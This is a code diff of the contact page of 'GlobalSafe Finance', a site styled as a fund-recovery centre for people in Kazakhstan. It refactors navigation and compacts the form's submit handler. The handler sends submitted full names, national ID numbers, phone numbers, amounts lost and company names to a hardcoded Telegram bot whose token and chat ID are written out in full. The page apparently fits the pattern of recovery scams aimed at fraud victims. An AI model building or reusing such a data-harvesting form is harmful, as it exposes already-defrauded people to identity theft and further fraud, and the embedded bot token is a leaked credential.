@@ -48,10 +48,7 @@ body{background:#030712}
   </style>
 </head>
 <body>
-  <nav class="nav">
-    <a href="../" class="nav-brand"><div class="nav-mark">🌐</div><div><div class="nav-name">GlobalSafe Finance</div><div class="nav-tag">Центр возврата средств</div></div></a>
-    <div class="nav-menu"><a href="../articles/">Аналитика</a><a href="../success/">Кейсы</a><a href="../contacts/" class="nav-cta" style="padding:10px 24px;background:rgba(99,102,241,.15);border:1px solid rgba(99,102,241,.3);border-radius:8px;color:#a5b4fc;font-weight:600;font-size:.82rem;text-decoration:none">Оставить заявку</a></div>
-  </nav>
+  <div id="nav-container" data-page="contacts"></div>
   <div class="fp">
     <div class="fc">
       <h1>📋 Центр обращений</h1>
@@ -75,33 +72,14 @@ body{background:#030712}
     <div class="hl"><div class="hl-d">Экстренные горячие линии</div><div class="hl-p">1434 · 102 · 116</div><div class="hl-d">АРРФР · Полиция · Психологическая помощь</div></div>
   </div>
   <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
+  <script src="../assets/js/nav.js"></script>
   <script>
   document.querySelectorAll('.to').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.to').forEach(function(x){x.classList.remove('sel')});this.classList.add('sel');this.querySelector('input').checked=true;var t=this.dataset.t;document.querySelector('.rf').style.display=t==='return'?'block':'none';document.querySelector('.df').style.display=t==='docs'?'block':'none';document.querySelector('.ff').style.display=t==='feedback'?'block':'none';document.querySelector('.of').style.display=t==='org'?'block':'none'})});
   document.getElementById('cf').addEventListener('submit',async function(e){
-    e.preventDefault();
-    var b=this.querySelector('.sb');b.disabled=true;b.querySelector('span').textContent='Отправка...';
-    var type=document.querySelector('input[name="type"]:checked').value;
-    var t='📋 *Новое обращение*\n\n📌 Тип: '+type+'\n\n';
-    var rf=document.querySelector('.rf');
-    if(rf.style.display!=='none'){
-      var d=new FormData(this);
-      t+='👤 ФИО: '+d.get('name')+'\n🆔 ИИН: '+d.get('iin')+'\n📱 Телефон: '+d.get('phone');
-      if(d.get('extraPhones'))t+='\n📞 Доп: '+d.get('extraPhones');
-      if(d.get('amount'))t+='\n💰 Сумма: '+d.get('amount')+' ₸';
-      if(d.get('company'))t+='\n🏢 Компания: '+d.get('company');
-      if(d.get('callTime'))t+='\n📅 Звонить: '+d.get('callTime');
-      if(d.get('comment'))t+='\n💬 '+d.get('comment');
-    }else{
-      var d=new FormData(this);
-      if(d.get('docName'))t+='👤 ФИО: '+d.get('docName')+'\n📱 Телефон: '+d.get('docPhone')+'\n📄 Документ: '+d.get('docType')+'\n💬 '+d.get('docComment');
-      if(d.get('fbName'))t+='👤 Имя: '+d.get('fbName')+'\n📋 Тема: '+d.get('fbTopic')+'\n💬 '+d.get('fbMessage');
-      if(d.get('orgName'))t+='👤 ФИО: '+d.get('orgName')+'\n🏛️ Организация: '+d.get('orgType')+'\n💬 '+d.get('orgComment');
-    }
-    try{
-      var r=await fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:t})});
-      if(r.ok){document.getElementById('cf').style.display='none';document.getElementById('fs').style.display='block'}
-      else{alert('Ошибка отправки');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}
-    }catch(err){alert('Ошибка сети');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}
+    e.preventDefault();var b=this.querySelector('.sb');b.disabled=true;b.querySelector('span').textContent='Отправка...';
+    var type=document.querySelector('input[name="type"]:checked').value;var t='📋 *Новое обращение*\n\n📌 Тип: '+type+'\n\n';
+    var rf=document.querySelector('.rf');if(rf.style.display!=='none'){var d=new FormData(this);t+='👤 ФИО: '+d.get('name')+'\n🆔 ИИН: '+d.get('iin')+'\n📱 Телефон: '+d.get('phone');if(d.get('extraPhones'))t+='\n📞 Доп: '+d.get('extraPhones');if(d.get('amount'))t+='\n💰 Сумма: '+d.get('amount')+' ₸';if(d.get('company'))t+='\n🏢 Компания: '+d.get('company');if(d.get('callTime'))t+='\n📅 Звонить: '+d.get('callTime');if(d.get('comment'))t+='\n💬 '+d.get('comment')}
+    try{var r=await fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:t})});if(r.ok){document.getElementById('cf').style.display='none';document.getElementById('fs').style.display='block'}else{alert('Ошибка');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}}catch(err){alert('Ошибка сети');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}
   });
   </script>
 </body>
